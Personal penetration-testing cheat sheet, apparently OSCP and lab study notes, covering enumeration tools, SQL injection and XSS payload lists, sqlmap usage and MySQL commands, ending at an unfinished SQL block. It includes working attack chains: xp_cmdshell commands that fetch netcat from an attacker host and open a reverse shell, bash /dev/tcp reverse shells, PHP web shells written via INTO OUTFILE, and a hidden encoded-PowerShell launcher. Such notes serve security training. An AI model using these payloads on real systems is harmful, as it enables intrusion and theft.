Ctl + D               # burp short keys - Drop intercepted request  
Ctl + U               # burp short keys - URL-decode selected text  
Ctl + Shift + H       # burp short keys - Show/hide HTTP message headers  
Ctrl + Tab            # burp short keys - Move to the next tab (clockwise)
Ctrl + Shift + Tab    # burp short keys - Move to the previous tab (counter-clockwise)
```

### Find usernames 
```
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <IP_ADDRESS>
```

### Createing a list of Usernames based on some Recon

Lets say we have a list of usernames

```sh
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

This tool can create various mutatation/permutaitons of them if we provide them in a file: `names.txt`. It also creates email addresses based on the domain. Username Genreation
https://github.com/secoats/spraygen

```sh
python3 spraygen.py -i names.txt -o CandidateUsernames.txt    # Username Genreation Generator
```

```sh
python3 spraygen.py -i ListOfPeople.txt -d nagoya-industries.com -e -o EmailOnlyUsernames.txt   # Username Genreation Generator
```

This was an altenative I previously used. 
Username gen tool: https://github.com/urbanadventurer/username-anarchy
```sh
ruby /home/kali/Tools/username-anarchy/username-anarchy -i names.txt > usernames2.txt   # Username Genreation Generator
```

---- 
### Wordlists 
- https://wordlists.assetnote.io/ AssetNote Wordlists
- https://github.com/six2dez/OneListForAll “Recon for the win” guy
- https://github.com/danielmiessler/SecLists/tree/master 
- https://github.com/0xPugal/fuzz4bounty?tab=readme-ov-file
- /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt - Usernames list


```
# Good standard wordlist - /usr/share/wordlists/dirb/common.txt 
# Bigger wordlist - /usr/share/wordlists/dirb/big.txt 
# popoular wordlist - /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt

```


### Wordlists for start usernames
```
git clone https://github.com/insidetrust/statistically-likely-usernames.git
```




### Web tech analysis tools:
- Whatruns https://chrome.google.com/webstore/detail/whatruns/cmkdbmfndkfgebldhnkbfhlneefdaaip?hl=en
-  and Wappalyzer ( has Cli too) 

### Polyglot Pyloads
Polyglot XSS payload:
```
jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
- SQLi `SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/` - this works in single quote context, double quote context, as well as "straight into query" context.
- TODO Read : https://dev.to/didymus/xss-and-sqli-polyglot-payloads-4hb4

## feroxbuster

```
feroxbuster -u http://192.168.179.147:17445 -t 100 -x php,html,txt --rate-limit 150 --redirects --scan-dir-listings -o Feroxx_SCAN.txt
feroxbuster -u 192.168.179.250 -t 100 -x php,html,txt --rate-limit 200 --depth 5 --redirects -o cmprhnsv_Ferox_scan-250.txt
feroxbuster -u http://192.168.179.142/Kazekage -t 100 --rate-limit 150 --redirects --scan-dir-listings -o Kazekage-GaaraSpecificFuzz.txt --force-recursion -x php,html,txt -m GET,POST -C 502,404

feroxbuster -u http://192.168.179.153:8000 -x asax,ascx,ashx,asmx,aspx,axd -E -g -t 100 --rate-limit 150 --redirects --scan-dir-listings -C 404 -o 8000-Ferox-asaX-SCAN.txt   # ASP.NET focussed scan - WIP
```

## Gobuster
Basic enumeration mode:  dir:
- `gobuster dir -u 192.168.179.20 -w /usr/share/wordlists/dirb/common.txt -t 5`
- `gobuster dir -u http://192.168.179.192 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 20 -x txt,php,html -r -o gobuster_results.txt -k`
- `gobuster dir -u http://192.168.179.192:5985/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -t 20 -r`
- `gobuster dir -u http://10.129.36.36 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 20 -o GobusterOutput.txt -t 5`
- `gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o GobusterOutput.txt`
- **OSCP list mentioned**: `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt`
- `gobuster dir -u http://192.168.179.63:450 -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,html`   Butch SQLi   

Subdomain enumeration:
- `gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -u http://thetoppers.htb -o GobusterOutput.txt` 

Where... 
vhost : Uses VHOST ( normally the IP _ADDR )
-w : Path to the wordlist
-u : Specify the URL
-t: threads

Note: If using Gobuster version 3.2.0 and above we also have to add the --append-domain flag to our
command so that the enumeration takes into account the known vHost ( thetoppers.htb ) and appends it
to the words found in the wordlist ( word.thetoppers.htb ).

**Gobuster DNS module**
- `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"`

Example from work: `gobuster vhost -u https://URL -w /Users/geoffreyowden/Tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k --exclude-length 3701,435 -o GobusterOutput.txt`


**Gobuster Pattern files**

Perhaps you want to try an Api enumeration with different patterns for the api version eg v1,v2,v3 etc. You can supply a pattern file with the following content and this will 
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

Then, to enumerate the API with **gobuster** using the following command:

`gobuster dir -u http://192.168.179.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt`

##### Gobuater with creds
```
gobuster dir -U admin -P admin -w /usr/share/wordlists/dirb/common.txt -u http://<TARGET_IP>/svn      # gobuster with creds - Offsec PG Phobos
```

## DNS scanning
```
host www.megacorpone.com
host -t mx www.megacorpone.com   # mail exchange type scan

for ip in $(cat list.txt); do host $ip.megacorpone.com; done`
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"

dnsrecon -d megacorpone.com -t std
dnsrecon -d megacorpone.com -D ~/list.txt -t brt

```

### Type values for `-t` 
- **std**: Standard enumeration (SOA, NS, A, AAAA, MX, and SRV).
- **rvl**: Reverse lookup of a given CIDR or IP range.
- **brt**: Brute force domains and hosts using a given dictionary.
- **srv**: SRV records enumeration.
- **axfr**: Test all NS servers for a zone transfer.
- **bing**: Perform Bing search for subdomains and hosts.
- **yand**: Perform Yandex search for subdomains and hosts.
- **crt**: Perform crt.sh search for subdomains and hosts.
- **snoop**: Perform cache snooping against all NS servers for a given domain, testing all with a file containing the domains (file given with `-D` option).
- **tld**: Remove the TLD of the given domain and test against all TLDs registered in IANA.
- **zonewalk**: Perform a DNSSEC zone walk using NSEC records.


# DNSEnum 
Another popular DNS enumeration tool that can be used to further automate DNS enumeration of the megacorpone.com domain.
```
dnsenum --enum --dnsserver 8.8.8.8 --threads 50 --scrap 50 --pages 10 --recursion --whois --output DNS-results.xml <WEBSITE-OR-IP>
dnsenum --enum --dnsserver 8.8.8.8 --threads 10 --scrap 50 --pages 10 --file /path/to/your/subdomains.txt --recursion --whois --output results.xml example.com
```
##### Explanation of the Options:
1. **General Options**:
    - `--enum`: This is a shortcut option equivalent to `--threads 5 -s 15 -w`. It enables threading, sets a delay, and performs WHOIS queries.
    - `--dnsserver <your_dns_server>`: Use a specific DNS server for A, NS, and MX queries.
    - `--threads 10`: Set the number of threads to 10 for parallel queries.
    - `--timeout 10`: (default) Set the timeout for TCP and UDP queries to 10 seconds.
    - `--verbose`: Show all progress and error messages.
2. **Google Scraping Options**:
    - `--scrap 50`: Scrape up to 50 subdomains from Google.
    - `--pages 10`: Process up to 10 pages of Google search results.
3. **Brute Force Options**:
    - `--file /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` A good starting point file other than the default for brute-forcing subdomains.
    - `--recursion`: Enable recursion on discovered subdomains with NS records.
4. **WHOIS Netrange Options**:
    - `--whois`: Perform WHOIS queries on class C network ranges.
5. **Output Options**:
    - `--output results.xml`: Save the results in XML format, which can be imported into tools like MagicTree.



### ffuf
Domain name look up with ffuf
- `ffuf -u http://DOMAIN -H "Host: FUZZ.DOMAIN" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 5`


### dnsrecon
```sh
dnsrecon -d 10.129.17.50 -r 10.0.0.0/8 # Does reverse lookup accross the network range
```

####  dns server hackery ( snd-admin) htb Resolute
```
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.9\share\da.dll

sc.exe stop dns
sc.exe start dns

bash: sudo impacket-psexec megabank.local/administrator@<VICTIM_IP>
```

# **nslookup** (for Windows DNS enumeration)
- `nslookup mail.megacorptwo.com`
- `nslookup -type=TXT info.megacorptwo.com`

```
# Set the DNS server to use
nslookup
> server 8.8.8.8

# Query A record
> set type=A
> example.com

# Query AAAA record
> set type=AAAA
> example.com

# Query MX record
> set type=MX
> example.com

# Query NS record
> set type=NS
> example.com

# Query SOA record
> set type=SOA
> example.com

# Query TXT record
> set type=TXT
> example.com

# Query CNAME record
> set type=CNAME
> www.example.com

# Query PTR record (Reverse DNS Lookup)
> set type=PTR
> 192.0.2.1

# Query SRV record
> set type=SRV
> _sip._tcp.example.com

# Query ANY record (All available records)
> set type=ANY
> example.com

# Exit nslookup
> exit
```

### Whatweb 
Default install on Kali
```
whatweb -a3 https://www.facebook.com -v
# - a Aggressive 1-3 
# -v verbose
```
### Aquatone
Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.
See: https://github.com/michenriksen/aquatone

```
sudo apt install golang chromium-driver
go get github.com/michenriksen/aquatone
export PATH="$PATH":"$HOME/go/bin"
```
## wafw00f (Web appplication Firewall Fingerprinting)
`wafw00f -a https://bbc.com -v` - Check all and verbose WAFs at the site 

## SQLi Testing

  

```
'
''
`
``
'-- -
"
""
;
;-- -
#
'-- -
'--
1'--
1 and 1=1-- -
1 and 1=2-- -
admin' or 1=1 --
offsec' OR 1=1 -- //
' Union select * from employees;
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

A hacktricks SQLi Testing list

```
true
1
1>0
2-1
0+1
1*1
1%2
1 & 1
1&1
1 && 2
1&&2
-1 || 1
-1||1
-1 oR 1=1
1 aND 1=1
(1)oR(1=1)
(1)aND(1=1)
-1/**/oR/**/1=1
1/**/aND/**/1=1
1'
1'>'0
2'-'1
0'+'1
1'*'1
1'%'2
1'&'1'='1
1'&&'2'='1
-1'||'1'='1
-1'oR'1'='1
1'aND'1'='1
1"
1">"0
2"-"1
0"+"1
1"*"1
1"%"2
1"&"1"="1
1"&&"2"="1
-1"||"1"="1
-1"oR"1"="1
1"aND"1"="1
1`
1`>`0
2`-`1
0`+`1
1`*`1
1`%`2
1`&`1`=`1
1`&&`2`=`1
-1`||`1`=`1
-1`oR`1`=`1
1`aND`1`=`1
1')>('0
2')-('1
0')+('1
1')*('1
1')%('2
1')&'1'=('1
1')&&'1'=('1
-1')||'1'=('1
-1')oR'1'=('1
1')aND'1'=('1
1")>("0
2")-("1
0")+("1
1")*("1
1")%("2
1")&"1"=("1
1")&&"1"=("1
-1")||"1"=("1
-1")oR"1"=("1
1")aND"1"=("1
1`)>(`0
2`)-(`1
0`)+(`1
1`)*(`1
1`)%(`2
1`)&`1`=(`1
1`)&&`1`=(`1
-1`)||`1`=(`1
-1`)oR`1`=(`1
1`)aND`1`=(`1
```

More ( but not all ) SQL injection testing notes [here at this link](https://github.com/HackTricks-wiki/hacktricks/blob/a06174cf560d32b896f38caf913f859b4b286b70/src/pentesting-web/sql-injection/README.md)

Could this tool help at all? - https://github.com/21y4d/blindSQLi/blob/master/blindSQLi.py

You can find [the comprehensive list of recommended SQLi auth bypass payloads in PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass), each of which works on a certain type of SQL queries.

Other payload lists:
- https://github.com/payloadbox/sql-injection-payload-list
- https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt

#### Default Ports

**MySQL ( and MariaDB)**
- `3306 TCP`
- `3306 UDP` (Rarely used)

**MSSQL**
- `1443 TCP`
- `1434 UDP`

**PostgresSQL**
- `5432 TCP`
- `UDP` (Rarely used)

**DB2**
- `50000 TCP`
- `UDP` (Rarely used)

#### Note on `//`
By forcing the closing quote on the uname value and adding an OR 1=1 statement followed by a -- comment separator and two forward slashes (//), we can prematurely terminate the SQL statement. The syntax for this type of comment requires two consecutive dashes followed by at least one whitespace character.
 

In this section's examples, we are trailing these comments with two double slashes. This provides visibility on our payload and also adds some protection against any kind of whitespace truncation the web application might employ.


### In-band to UNION injection

`UNION` allows us to combine 2 SQL commands. Whenever we're dealing with **in-band SQL injections** and the result of the query is displayed along with the application-returned value, we should also test for UNION-based SQL injections. 

For UNION SQLi attacks to work, we first need to satisfy two conditions:
- The injected UNION query has to include the same number of columns as the original query.
- The data types need to be compatible between each column.

To discover the correct number of columns, we can submit the following injected query into the search bar: `' ORDER BY n-- //` , incrementing the column value each time so:
- `' ORDER BY 1-- //`
- `' ORDER BY 2-- //`
- `' ORDER BY n-- //`

The above statement orders the results by a specific column, meaning **it will fail whenever the selected column does not exist, so then we know our column amount was the -n successful payload**
If we discover it is 5 columns we can then things like `%' UNION SELECT null, database(), user(), @@version, null -- //` , where:
- column 1 is typically reserved for an ID field consisting of an _integer_ data type, which the web application will often ommit, hence whi we shift the enumeration up 1 colums eg `...SELECT null...`
- `%'` will close the search param, so can then begin the `UNION`


To test for Time based blind SQLi our payloads might look like:
- `admin' AND IF (1=1, sleep(5),'false') -- //`




#### 🔍 Minimal SQLi System-Level Capability Test Suite ( adapted from HTB Jarvis )
```

# ——— Test 1: File Read Capability ———

UNION SELECT NULL, load_file('/etc/passwd'), NULL,NULL,NULL-- -                                     # SQLi File Read - MySQL/MariaDB - Attempt to read /etc/passwd
UNION SELECT NULL, pg_read_file('/etc/passwd', 0, 1000), NULL,NULL,NULL-- -                         # SQLi File Read - PostgreSQL - Attempt to read /etc/passwd
UNION SELECT NULL, xp_cmdshell('type C:\Windows\win.ini'), NULL,NULL,NULL-- -                       # SQLi File Read - MSSQL - Read system file via shell
UNION SELECT NULL, utl_file.get_line(utl_file.fopen('/etc','passwd','r'),1), NULL,NULL,NULL-- -     # SQLi File Read - Oracle - Read using UTL_FILE
UNION SELECT NULL, xmlserialize(xmlagg(xmltext(service_level))), NULL,NULL,NULL-- -                 # SQLi File Read - DB2 - Indirect system info test

# ——— Test 2: Try and force an Error to Leak Paths ———

UNION SELECT NULL, load_file('/this/does/not/exist'), NULL,NULL,NULL-- -                            # SQLi force an error - MySQL/MariaDB - Trigger error with bad path
UNION SELECT NULL, pg_read_file('/this/does/not/exist'), NULL,NULL,NULL-- -                         # SQLi force an error - PostgreSQL - Force error for path leakage
UNION SELECT NULL, xp_cmdshell('dir C:\Nope'), NULL,NULL,NULL-- -                                   # SQLi force an error - MSSQL - Force directory error/listing

# ——— Test 3: Attempt to Write File ———

UNION SELECT NULL, 'canWeWritetoFIles', NULL,NULL,NULL INTO OUTFILE '/tmp/test.txt'-- -             # SQLi write arbitrary data - MySQL/MariaDB - Write to web root
COPY (SELECT 'canWeWritetoFIlesWithCOPY') TO '/tmp/test.txt';                                       # SQLi write arbitrary data - PostgreSQL - Attempt file write via COPY
xp_cmdshell 'echo canWeWritetoFIles > C:\Windows\Tasks\test.txt'                                    # SQLi write arbitrary data - MSSQL - Write shell-accessible file via command



### 🔍 Read Back: Verifying What Was Written to the System

# ——— Linux: /dev/shm ———

UNION SELECT NULL, load_file('/dev/shm/test.txt'), NULL,NULL,NULL-- -                              # SQLi Read back the data we wrote - Read back from /dev/shm to confirm file write
UNION SELECT NULL, 'test_marker_' || NOW(), NULL,...-- -                                           # SQLi Read back the data we wrote - Write timestamped marker for traceability
UNION SELECT NULL, '', NULL,NULL,NULL INTO OUTFILE '/dev/shm/test.txt'-- -                         # SQLi Read back the data we wrote - Overwrite file with blank content
UNION SELECT NULL, 'rm /dev/shm/test.txt', NULL,...-- -                                            # SQLi Read back the data we wrote - (If exec possible) remove file from /dev/shm

# ——— Windows: C:\Windows\Tasks ———

xp_cmdshell 'type C:\Windows\Tasks\test.txt'                                                       # SQLi Readback on Windows - Read file contents from Windows Tasks
xp_cmdshell 'dir C:\Windows\Tasks'                                                                 # SQLi Readback on Windows - List directory to verify presence of written file
xp_cmdshell 'echo test_marker_%time% > C:\Windows\Tasks\test.txt'                                  # SQLi Readback on Windows - Write timestamped marker
xp_cmdshell 'del C:\Windows\Tasks\test.txt'                                                        # SQLi Readback on Windows - Delete file to clean up
```

```
union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata;-- -
union select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='november'
```


### Time-based blind out-of-band SQL (OSCP Convid)
1. Determine the Number of Columns in the Query
```
admin' UNION SELECT NULL-- # Causes an error (fewer columns)
admin' UNION SELECT NULL, NULL-- # Valid (correct number of columns)
admin' UNION SELECT NULL, NULL, NULL-- # Causes an error (too many columns)
```

2. Determine visible Columns
```
' ORDER BY 1-- // Check first column
' ORDER BY 2-- // Check second column
' ORDER BY 3-- // Causes error (only 2 columns exist)
```
3. Execute a Time based test payload
```
admin' OR 1=1; WAITFOR DELAY '0:0:3'--                        # Causes a 3-second delay
```

4. Enable Out-of-band Command execution
```
admin' OR 1=1; EXEC sp_configure 'show advanced options', 1--
admin' OR 1=1; RECONFIGURE--
admin' OR 1=1; EXEC sp_configure 'xp_cmdshell', 1--
admin' OR 1=1; RECONFIGURE--
```
5. Test OOB Command excution
```
# On yor local Linux
sudo tcpdump -i any icmp

# Use payload in the vuln input like ( might need to uses double quotes on the ping)
admin'; EXEC xp_cmdshell('ping 192.168.179.195'); --
admin'; EXEC xp_cmdshell'ping 192.168.179.247        # This worked on MedTech OSCP

```

6. Get your tools for reverese shell from your local Server
```
admin' or 1=1; EXEC xp_cmdshell "powershell.exe wget http://192.168.179.195/nc64.exe -OutFile C:\windows\temp\nc64.exe";--
```
7. Reverse the shell to your local Listener ( powershell might prefer 443 ??)
```
admin' or 1=1; EXEC xp_cmdshell "C:\windows\temp\nc64.exe -e cmd.exe 192.168.179.195 443";--
```
8. Find the flag and get the flag

```
C:> dir C:\flag.txt /s /p /a                                                # Find the flag or any file
C:> dir C:\*.txt /s /p /a                                                   # Find the flag or any file
C:> type C:\inetpub\wwwroot\flag.txt`                                       # Find the flag or any file
K~: find / -type f -iname "flag.txt" 2>/dev/null                            # Find the flag or any file
P:> Get-ChildItem -Path C:\ -Filter local.txt -Recurse -Force 2>$null       # find the flag silently 
C:> dir C:\local.txt /s /p /a 2>null                                         # find the flag silently

whoami; hostname; ipconfig; type C:\inetpub\wwwroot\flag.txt                # Print the flag or any file
```

## Note on the information_schema

The **information_schema** has a `COLUMNS` table ( slightly confusing ) referenced with `information_schema.colums`. This table itself has a few important columns which are useful to hackers.
- table catagory
- table schema
- table name 
- columns name

eg - `union SELECT table_schema, table_name, column_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';`

To not get he information schema data itself 
- `SELECT table_schema, table_name, column_name FROM information_schema.tables WHERE table_schema != 'information_schema';`

To not get most default information about the data itself 
- `SELECT table_schema, table_name, column_name FROM information_schema.tables WHERE table_schema != 'information_schema' and table_schema != 'performance_schema'; table_schema != 'mysql'`

#### Get all table names in the DBS ( same in MySQL, MSSQL and PostgreSQL):

- `SELECT table_schema, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';`
#### Basic test for command execution with SQLi
```
' union select sleep(10); --
' union select 'test' into outfile '/var/www/html/test.txt'; -- # the webroot may vary
```

## Getting a shell
**Checks if you can get a shell**
1.  In MYSQL Look in the database `users` table for a column called `file priv` setting
	- `union select File_priv,2,3 from mysql.user where user ="bobby";     #`
2. Check for read/write restrictions `secure_file_priv` variable. This var is to limit , eg `LOAD DATA` and `SELECT ... INTO OUTFILE` or `LOAD_FILE()`.  It needs to be referenced in the sql payload like `@secure_file_priv`.  
	1. **If the variable returns empty , the variable has no effect**
	2. A directory name returned means that dir only
	3. NULL means everywhere is restricted
3. Can we read a file 
	1. ` union select load_file("/etc/passwd"),2,3 # `
4. Can we write files?
	1. ` union select 1,2,3 into outfile "/tmp/test.txt" # `
		1. This might return a logical app error not a db error so it may have been written
5. Write a shell
	1. After proper enumeration and you have found a writable directory ( perhaps in a UI)
		1. `union select "Hello from the void" into outfile "/var/www.html/VULN/test.txt" #`
		2. `union select "<?php system($_GET[\"cmd\"]?>" into outfile "/var/www.html/VULN/shell.php" #`  - Might need to escape `"`


Union select file write from Off sec Medjed
```
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/web.php'  -- -'             # PIA SQLi  payload from Offsec PG Medjed
```
## sqlmap
Although sqlmap is a great tool to automate SQLi attacks, **sqlmap provides next-to-zero stealth. Due to its high volume of traffic, sqlmap should not be used as a first choice tool during assignments that require staying under the radar.**

```
sqlmap -r req.txt --dbms=mssql --technique=U --batch --dump
sqlmap -r req.txt --dbms=mssql --technique=T --batch -U butch --random-agent
```


`sqlmap -r req.txt -p search --os-pwn --batch` # gets a shell up (--os-pwn) as soon as possible (--batch)
Then, from the `os-shell` prompt call a shell:
- `bash -c "bash -i >& /dev/tcp/10.10.14.147/4444 0>&1"`

**Alt**
```
sqlmap -r adminReq.txt --risk=3 --level=3 --batch --force-ssl --dbms=postgresql -t 200 --dbs --flush --os-shell
# --flush - will clear out all the history so yo ucan run it fresh each time
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.93/4444 0>&1' # basic reverse shell
```

On Mysql ( Linux) if we can find out the webroot and intercept a request:
`sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"`
Once sqlmap confirms the vulnerability, it prompts us for the language the web application is written in.



### sqlmap specific attack Techniques 
```
--technique=B               # sqlmap - Boolean-Based Blind: uses true/false conditions to infer data indirectly
--technique=E               # sqlmap - Error-Based: forces the database to display error messages revealing information
--technique=U               # sqlmap - Union-Based: uses UNION SELECT to combine malicious and legitimate queries
--technique=S               # sqlmap - Stacked Queries: executes multiple SQL commands in a single statement
--technique=T               # sqlmap - Time-Based Blind: induces delays to infer data from server response times
--technique=Q               # sqlmap - Inline Queries: uses subqueries within queries to retrieve data
```

### Sqlmap Settings that could make it gentler 
```
--delay=2                     # sqlmap - Introduces a 2-second delay between each request
--timeout=40                  # sqlmap - Sets the timeout for each HTTP request to 40 seconds. Default is 30
--retries=3                   # sqlmap - Retries a failed request up to 3 times before giving up
--threads=1                   # sqlmap - Reduces the number of concurrent threads to 1, making it less aggressive. Default is 3, max is 10
--random-agent                # sqlmap - Uses a random User-Agent header to avoid detection by web application firewalls
--safe-url=http://example.com # sqlmap - Periodically visits this URL to refresh sessions or cookies if needed
--safe-freq=10                # sqlmap - Runs a "safe" request every 10 requests to maintain session
```

### sqlmap on websockets
```
`sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --batch`
Search his site for boolean injection . * will tell sqlmap to test that param
```


## Password reset in the database
Some data bases have a password reset token in a colum so this is worth looking for becasue if it is set , then you could reset the admins password!

## Websockets
#### WS tools 
- **Websocat** 
- **wscat** ( desn't support accepting data from a file)
WebSocat - Can act as a client or a server like curl , nc , socat.

# XSS

## Identifying XSS Vulnerabilities

1. Find potential entry points for XSS by examining a web application and identifying input fields (such as search fields) that accept unsanitised input, which is then displayed as output in subsequent pages.

2. Once we identify an entry point, input `special characters` and observe the output to determine if any of the special characters return unfiltered.

The most common special characters used for this purpose include:

```
<
>
'
"
{
}
;
```
### Two interesting cookie flags for XSS (if they are missing)
`secure` - Only send cookie over encrypted connections eg "https". This protects the cookie from being sent in clear text and captured over the network.
`httpOnly` - Deny javascript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

### Encode js XSS payloads so bad characters won't interfere
Once you have [MINIFIED_YOUR_JAVASCRIPT](https://jscompress.com/) payload, you can encode it:
```js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('INSERT_MINIFIED_JAVASCRIPT_HERE')
console.log(encoded)
```

### Funky Proxying 
So we can see the websocket behaviour: When the app makes a call to the target it will go to 127:1 , Burpe will intercept this , and then burp will send it on to the Real product so we can see all the WS traffic.

- Change the target's ip 127.0.0.1
- Create new proxy listener in burp for port 127.0.0.1:5789 (loopback only)
- In the Request handling tab redirect to the original Target IP 10.129.228.216



<details>
	<summary>Websockets Proxy script</summary>

  From HTB - Sockets

```

#!/usr/bin/env python3

# websocket proxy

'''
Will need to update our hosts file, pointing TARGET_URL to localhost , since we will fire up the server target Port locally and then point the remote_url parameter to the target's IP address

So if the target was running on (10.10.11.206) somedomain.xyz:5789 we will use a command to run this script like : 
python3 ws_proxy.py --host 127.0.0.1 --port 5789 --remote_url ws://10.10.11.206:5789
'''

import argparse
import asyncio
import websockets


async def hello(websocket, path):
    '''Called whenever a new connection is made to the server'''

    url = REMOTE_URL + path
    async with websockets.connect(url) as ws:
        taskA = asyncio.create_task(clientToServer(ws, websocket))
        taskB = asyncio.create_task(serverToClient(ws, websocket))

        await taskA
        await taskB


async def clientToServer(ws, websocket):
    async for message in ws:
        print(f"Client -> Server === {message}")
        await websocket.send(message)


async def serverToClient(ws, websocket):
    async for message in websocket:
        print(f"Server -> Client === {message}")
        await ws.send(message)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='websocket proxy.')
    parser.add_argument('--host', help='Host to bind to.',
                        default='localhost')
    parser.add_argument('--port', help='Port to bind to.',
                        default=8765)
    parser.add_argument('--remote_url', help='Remote websocket url',
                        default='ws://localhost:8767')
    args = parser.parse_args()

    REMOTE_URL = args.remote_url

    start_server = websockets.serve(hello, args.host, args.port)

    asyncio.get_event_loop().run_until_complete(start_server)
    asyncio.get_event_loop().run_forever()

```

</details>

 

### Reverse shell for Powershell Linpeas
```sh
python3 -m http.server 80
powershell
wget http://10.10.14.114/winPEASx64.exe -outfile winPEASx64.exe
```


Good reverese shell haNDLER FOR WINDOWS  - https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1 - HAS TAB COMPLETION ETC

#### Powershell Remoting
Enabled by default on the DC and built into powershell , and if a ticket of a user is cached we can run remote commands from am networked machine to the DC.

#### Run Commands with Powershell Remoteing
```
Invoke-Command -ComputerName DC01 -ScriptBlock {ipconfig}    # Powershell Remoteing - Running single commands 
```
#### Get a Shell with Powershell Remoteing
```
$DC01Session = New-PSSession -ComputerName 'DC01'            # Powershell Remoteing - 1: Create a variable for the session
Enter-PSSession -Session $DC01Session                        # Powershell Remoteing - 2: Enter the session 
[DC01]: PS C:\Users\hannah\Documents\                        # Powershell Remoteing - 3: You will then be presented with a terminal like 
```


### Powershell to compile c# code to get a reverse shell

After you have replaced the `BASE64_PAYLOAD`, Paste the following  into powershell and get a binary back which you can run with thing like Pass the Hash
```c#
$code = @"
using System;
namespace Game
{
    public class Program
    {
        public static void Main()
        {
            System.Diagnostics.Process P = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo SI = new System.Diagnostics.ProcessStartInfo();
            SI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            SI.FileName = "powershell.exe";
            SI.Arguments = "-enc <BASE64_PAYLOAD>";
            P.StartInfo = SI;
            P.Start();
        }
    }
}
"@

Add-Type -OutputType ConsoleApplication -OutputAssembly test.exe -TypeDefinition $code -Language CSharp
```

## MySql Cli
```
mysql -h 192.168.161.88 -u root -p --skip-ssl                                   # mysql Cli from kali - Try this first - OFfsec Sunset-Midnight
mysql -h <IP_ADDRESS> -u BitForgeAdmin -p --skip-ssl                            # mysql Cli from kali - if ssl error "ERROR 2026 (HY000): TLS/SSL error: SSL"
mysql --ssl=0 --ssl-verify-server-cert=0  -h <IP_ADDRESS> -u Sompassword        # mysql Cli from kali - Alt login to ignore cirts 
mysql -h <IP_ADDRESS> -u root --skip-password                                   # mysql Cli from kali
> SHOW GRANTS;                                                                  # mysql Cli from kali - Permissions  things like GRANT ALL PRIVILEGES, CREATE USER , GRANT OPTION
> show databases;                                                               # mysql Cli from kali
> show tables;                                                                  # mysql Cli from kali
> select * from tables;                                                         # mysql Cli from kali
> select * from config;                                                         # mysql Cli from kali
```
Mysql conf sometimes at locations, such as `/var/www/` and `/var/www/html/`: /var/www/openemr/sites/default/sqlconf.php 


GRANT ALL PRIVILEGES, CREATE USER , GRANT OPTION


#### mysql adding a new user ( if you cant crack a password) and then set the admin password the same as a new user


Let say we could login to the db with the mysql cli but we cannot crack the password with hashcat or John
```
MariaDB [wordpress_db]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
```

update the data base wit ha new user who has the password of "password"

```sql
